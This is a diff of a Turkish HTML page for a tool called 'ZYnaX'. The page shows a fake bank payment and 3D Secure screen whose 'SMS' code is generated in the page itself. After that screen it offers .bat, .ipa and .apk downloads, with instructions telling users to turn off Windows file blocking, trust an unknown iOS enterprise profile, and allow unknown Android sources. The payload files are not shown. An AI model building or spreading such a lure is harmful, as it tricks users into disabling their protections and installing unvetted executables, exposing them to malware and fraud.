@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>ZYnaX v45 | BANK GRADE SECURITY</title>
+    <title>ZYnaX v45 | CROSS-PLATFORM GATEWAY</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Consolas', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
         #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
@@ -21,33 +21,35 @@
         .glitch { font-size: 50px; font-weight: 900; text-shadow: 2px 2px #f00, -2px -2px #00f; margin-bottom: 20px; }
         .start-btn { background: #ff9900; color: #000; padding: 15px 40px; font-size: 20px; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; box-shadow: 0 0 20px #ff9900; }
 
-        /* MODAL VE BANKA EKRANI */
+        /* MODAL */
         #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; backdrop-filter: blur(10px); }
-        #modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fdfdfd; color: #333; width: 400px; border-radius: 15px; z-index: 101; font-family: sans-serif; overflow: hidden; }
+        #modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fdfdfd; color: #333; width: 420px; border-radius: 15px; z-index: 101; font-family: sans-serif; overflow: hidden; max-height: 90vh; overflow-y: auto; }
 
-        .bank-header { background: #004a99; color: #fff; padding: 20px; text-align: left; font-weight: bold; display: flex; justify-content: space-between; }
-        .bank-content { padding: 30px; text-align: left; }
-        .input-group { margin-bottom: 15px; }
-        .input-group label { display: block; font-size: 11px; font-weight: bold; color: #777; }
+        .bank-header { background: #004a99; color: #fff; padding: 20px; text-align: left; font-weight: bold; }
+        .bank-content { padding: 30px; }
         .input-box { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; background: #f0f0f0; font-size: 16px; box-sizing: border-box; }
-        .pay-btn { background: #0070ba; color: #fff; width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .pay-btn { background: #0070ba; color: #fff; width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
 
-        /* 3D SECURE / YÜKLEME */
+        /* 3D SECURE */
         #secure-screen { display: none; padding: 40px; text-align: center; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #004a99; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* DOSYA MENÜSÜ */
-        #file-menu { display: none; padding: 30px; text-align: center; }
-        .file-card { display: block; background: #f8f8f8; border: 1px solid #004a99; padding: 15px; margin: 10px 0; text-decoration: none; color: #000; font-weight: bold; border-radius: 5px; transition: 0.3s; }
-        .file-card:hover { background: #004a99; color: #fff; }
-
-        /* GÜVENLİK TALİMATI STİLİ */
+        /* DOSYA LİSTESİ */
+        #file-menu { display: none; padding: 20px; text-align: center; }
+        .file-card { display: block; padding: 15px; margin: 8px 0; text-decoration: none; font-weight: bold; border-radius: 8px; font-size: 14px; color: #fff; text-align: center; }
+        
+        /* RENKLER */
+        .btn-win { background: #0078d4; }
+        .btn-ios { background: #000000; }
+        .btn-android { background: #3DDC84; color: #000; }
+        
         .security-note {
             background: #fff3cd; color: #856404; border: 1px solid #ffeeba;
-            padding: 10px; font-size: 11px; border-radius: 5px; margin-top: 20px;
-            text-align: left; line-height: 1.4;
+            padding: 10px; font-size: 11px; border-radius: 5px; margin: 5px 0 15px 0;
+            text-align: left;
         }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -56,8 +58,8 @@
     <div id="sms-pop">
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Android_Messages_icon.svg" width="40">
         <div>
-            <strong style="display:block; font-size: 12px; color: #666;">BANKA ONAY • ŞİMDİ</strong>
-            <span id="sms-text" style="font-size: 14px; font-weight: bold;"></span>
+            <strong style="display:block; font-size: 11px; color: #666;">BANKA ONAY • ŞİMDİ</strong>
+            <span id="sms-text" style="font-size: 13px; font-weight: bold;"></span>
         </div>
     </div>
 
@@ -67,45 +69,49 @@
     <div id="overlay"></div>
     <div id="modal">
         <div id="bank-step">
-            <div class="bank-header"><span>GÜVENLİ ÖDEME</span><span>VISA</span></div>
+            <div class="bank-header">GÜVENLİ ÖDEME SİSTEMİ</div>
             <div class="bank-content">
-                <div class="input-group"><label>KART SAHİBİ</label><input type="text" class="input-box" value="******** ********" disabled></div>
-                <div class="input-group"><label>KART NUMARASI</label><input type="text" class="input-box" value="**** **** **** 4492" disabled></div>
-                <p style="font-size: 14px; font-weight: bold; color: #d32f2f;">Tutar: 150,00 TL</p>
-                <button class="pay-btn" onclick="to3DSecure()">3D SECURE İLE ÖDE</button>
+                <p style="font-size: 12px; color: #666;">Kart Sahibi: <b>******** ********</b></p>
+                <p style="font-size: 12px; color: #666;">İşlem Tutarı: <b style="color:red;">150,00 TL</b></p>
+                <button class="pay-btn" onclick="to3DSecure()">3D SECURE İLE ONAYLA</button>
             </div>
         </div>
 
         <div id="secure-screen">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="30" style="margin-bottom: 20px;">
-            <div id="wait-loader"><div class="spinner"></div><p>Güvenli bağlantı kuruluyor...</p></div>
+            <div id="wait-loader"><div class="spinner"></div><p>Banka Onayı Bekleniyor...</p></div>
             <div id="otp-entry" style="display:none;">
-                <h3>3D Secure Onayı</h3>
-                <input type="text" id="user-otp" class="input-box" placeholder="Kod" maxlength="6" style="text-align:center; font-size: 24px;">
-                <p id="error-msg" style="color:red; font-size: 12px; display:none;">Hatalı kod!</p>
-                <button class="pay-btn" onclick="checkCode()">ONAYLA</button>
+                <h3>3D Secure</h3>
+                <input type="text" id="user-otp" class="input-box" placeholder="Kodu Girin" maxlength="6" style="text-align:center;">
+                <button class="pay-btn" style="margin-top:15px;" onclick="checkCode()">ONAYLA</button>
             </div>
         </div>
 
         <div id="file-menu">
-            <h2 style="color: #28a745;">✔ ERİŞİM SAĞLANDI</h2>
+            <h3 style="color: #28a745; margin-top: 0;">✔ SİSTEM ERİŞİMİ AÇILDI</h3>
             
-            <a href="ZYnaXPC-NO-SETUP.bat" class="file-card">WINDOWS PORTABLE (.BAT)</a>
-            
-            <div class="security-note">
-                <b>⚠️ KRİTİK GÜVENLİK ADIMI:</b><br>
-                Dosyayı indirdikten sonra; dosyaya <b>sağ tık</b> yapıp <b>Özellikler</b>'e girin. En aşağıda bulunan <b>"Güvenliği Kapat" (Engellemeyi Kaldır)</b> kutucuğunu işaretleyip Uygula/Tamam deyin. Aksi takdirde sistem hata verecektir.
-            </div>
+            <!-- WINDOWS -->
+            <a href="ZYnaX.bat" class="file-card btn-win">WINDOWS (.BAT) İNDİR</a>
+            <div class="security-note">⚠️ Sağ tık > Özellikler > En alttaki "Güvenliği Kapat" kutusunu işaretleyin.</div>
 
-            <a href="ZYnaXPC.py" class="file-card" style="margin-top:20px; font-size: 12px; opacity: 0.7;">WINDOWS PYTHON (.PY)</a>
-            <a href="ZYnaX_Mac.py" class="file-card" style="font-size: 12px; opacity: 0.7;">macOS VERSION (.PY)</a>
+            <!-- iOS -->
+            <a href="ZYnaX.ipa" class="file-card btn-ios">iOS (IPA) YÜKLE</a>
+            <div class="security-note">⚠️ Ayarlar > Genel > VPN ve Cihaz Yönetimi kısmından "ZYnaX Enterprise" onaylayın.</div>
+
+            <!-- ANDROID -->
+            <a href="ZYnaX.apk" class="file-card btn-android">ANDROID (APK) İNDİR</a>
+            <div class="security-note">⚠️ Ayarlar > Güvenlik > Bilinmeyen Kaynaklar seçeneğini aktif hale getirin.</div>
         </div>
     </div>
 
     <script>
-        const validCodes = ["778899", "112233", "445566", "990011", "554433"];
+        const validCodes = ["778899", "112233", "445566"];
         let currentCode = "";
-        function openBank() { document.getElementById('overlay').style.display = 'block'; document.getElementById('modal').style.display = 'block'; }
+
+        function openBank() { 
+            document.getElementById('overlay').style.display = 'block'; 
+            document.getElementById('modal').style.display = 'block'; 
+        }
+
         function to3DSecure() {
             document.getElementById('bank-step').style.display = 'none';
             document.getElementById('secure-screen').style.display = 'block';
@@ -113,30 +119,29 @@
                 document.getElementById('wait-loader').style.display = 'none';
                 document.getElementById('otp-entry').style.display = 'block';
                 currentCode = validCodes[Math.floor(Math.random() * validCodes.length)];
-                document.getElementById('sms-text').innerText = "ZYnaX Kodunuz: " + currentCode;
+                document.getElementById('sms-text').innerText = "ZYnaX İşlem Kodunuz: " + currentCode;
                 document.getElementById('sms-pop').classList.add('active');
             }, 5000);
         }
+
         function checkCode() {
             if (document.getElementById('user-otp').value === currentCode) {
                 document.getElementById('secure-screen').style.display = 'none';
                 document.getElementById('file-menu').style.display = 'block';
                 document.getElementById('sms-pop').classList.remove('active');
-            } else { document.getElementById('error-msg').style.display = 'block'; }
+            } else { alert("Hatalı kod!"); }
         }
+
+        // Matrix Efekti (Kısa versiyon)
         const canvas = document.getElementById('matrix'); const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "01ZYNAX"; const fontSize = 16; const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
+        const drops = Array(Math.floor(canvas.width / 16)).fill(1);
         function draw() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
-            for (let i = 0; i < drops.length; i++) {
-                const text = letters[Math.floor(Math.random() * letters.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            }
+            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = "#0f0"; drops.forEach((y, i) => {
+                ctx.fillText("01"[Math.floor(Math.random()*2)], i*16, y*16);
+                if (y*16 > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++;
+            });
         }
         setInterval(draw, 33);
     </script>
